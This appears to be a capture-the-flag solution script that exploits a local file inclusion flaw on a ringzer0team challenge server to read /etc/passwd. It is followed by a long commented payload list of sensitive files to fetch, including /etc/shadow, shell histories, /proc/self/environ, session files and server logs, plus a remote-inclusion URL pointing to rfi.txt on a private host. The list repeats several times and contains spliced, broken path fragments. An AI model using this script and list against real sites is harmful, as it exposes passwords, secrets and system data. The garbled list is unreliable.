#! /usr/bin/python3
import requests
import lxml.html as parser


#Website details
defaultpage='lorem.php'
host='http://challenges.ringzer0team.com:10075/?page='
defaulturl=host+defaultpage
target='/etc/passwd'
url=host+target



session=requests.Session()
response=session.get(url)
content=response.text
status=response.status_code

root=parser.fromstring(content)
result=root.xpath('//div[@class="container"]/p/text()')

flag=''.join(result)
print(flag)



# phpinfo.php
# /etc/php5/apache2/php.ini
# /etc/php/apache2/php.ini
# /var/log/apache/access.log
# /var/log/apache/error.log
# /var/log/nginx/access.log
# /var/log/nginx/error.log
# /var/log/vsftpd.log
# /var/log/sshd.log
# /var/log/mail
# /var/log/httpd/error_log
# /usr/local/apache/log/error_log
# /usr/local/apache2/log/error_log
# /etc/issue
# /etc/motd
# /etc/group 
# /etc/os-release
# /etc/resolv.conf 
# /etc/shadow
# /home/{user}/.bash_history
# /home/{user}/.bash_profile
# ~/.bash_history or .profile
# {user}/.bash_history or .profile
# /root/.bash_history or .profile
# .htaccess
# config.php
# /etc/httpd/logs/acces_log 
# /etc/httpd/logs/error_log 
# /var/www/logs/access_log 
# /var/www/logs/access.log
# /var/log/auth.log
# /usr/local/apache/logs/access_ log 
# /usr/local/apache/logs/access. log 
# /var/log/apache/access_log 
# /var/log/apache2/access_log 
# /var/log/apache/access.log 
# /var/log/apa/etc/issue
# /etc/motd
# /etc/passwd 
# /etc/group 
# /etc/os-release
# /etc/resolv.conf 
# /etc/shadow
# /home/root/.bash_history or .profile
# ~/.bash_history or .profile
# {user}/.bash_history or .profile
# /root/.bash_history or .profile
# .htaccess
# config.php
# /etc/httpd/logs/acces_log 
# /etc/httpd/logs/error_log 
# /var/www/logs/access_log 
# /var/www/logs/access.log
# /var/log/auth.log
# /usr/local/apache/logs/access_ log 
# /usr/local/apache/logs/access. log 
# /var/log/apache/access_log 
# /var/log/apache2/access_log 
# /var/log/apache/access.log 
# /var/log/apache2/access.log
# /var/log/access_log
# .bash_history
# .mysql_history
# .my.cnf
# /proc/sched_debug
# /proc/mounts
# /proc/net/arp
# /proc/net/route
# /proc/net/tcp
# /proc/net/udp
# /proc/net/fib_trie
# /proc/version
# /proc/self/environ
# /etc/passwd
# /var/log/mail/{user}
# /var/log/apache2/access.log
# /proc/self/environ
# /tmp/sess_{session}
# /var/lib/php5/sess_{session}
# /etc/security/passwd
# /etc/security/user
# /etc/security/environ
# /etc/security/limits
# inc/config.php
# inc/config.inc.php
# inc/config.inc
# config.inc
# /var/log/boot.log
# /var/log/secure
# /var/log/kern.log
# /var/log/faillog
# /var/log/cron
# /var/log/yum.log
# /var/log/mail.log
# /var/log/maillog
# var/log/httpd
# /var/log/mysql.log
# /var/log/mysqld.log
# /var/log/utmp
# /var/log/qmail
# /proc/self/cwd/index.php
# /home/$USER/.bash_history
# http://172.16.243.1:8080/rfi.txt
# /var/log/apache/access.log
# /var/log/apache/error.log
# /var/log/httpd/error_log
# /usr/local/apache/log/error_log
# /usr/local/apache2/log/error_log
# /var/log/nginx/access.log
# /var/log/nginx/error.log
# /var/log/vsftpd.log
# /var/log/sshd.log
# /var/log/mail
# che2/access.log
# /var/log/access_log
# .bash_history
# .mysql_history
# .my.cnf
# /proc/sched_debug
# /proc/mounts
# /proc/net/arp
# /proc/net/route
# /proc/net/tcp
# /proc/net/udp
# /proc/net/fib_trie
# /proc/version
# /proc/self/environ
# /etc/passwd
# /var/log/mail/USER
# /var/log/apache2/access.log
# /proc/self/environ
# /tmp/sess_{session}
# /var/lib/php5/sess_{session}
# /etc/security/passwd
# /etc/security/user
# /etc/security/environ
# /etc/security/limits
# inc/config.php
# inc/config.inc.php
# inc/config.inc
# config.inc
# /var/log/boot.log
# /var/log/secure
# /var/log/kern.log
# /var/log/faillog
# /var/log/cron
# /var/log/yum.log
# /var/log/mail.log
# /var/log/maillog
# var/log/httpd
# /var/log/mysql.log
# /var/log/mysqld.log
# /var/log/utmp
# /var/log/qmail
# /inc/config.php
# /proc/self/cwd/index.php
# /home/$USER/.bash_history
# /var/log/apache/access.log
# /var/log/apache/error.log
# /var/log/httpd/error_log
# /usr/local/apache/log/error_log
# /usr/local/apache2/log/error_log
# /var/log/nginx/access.log
# /var/log/nginx/error.log
# /var/log/vsftpd.log
# /var/log/sshd.log
# /var/log/mail


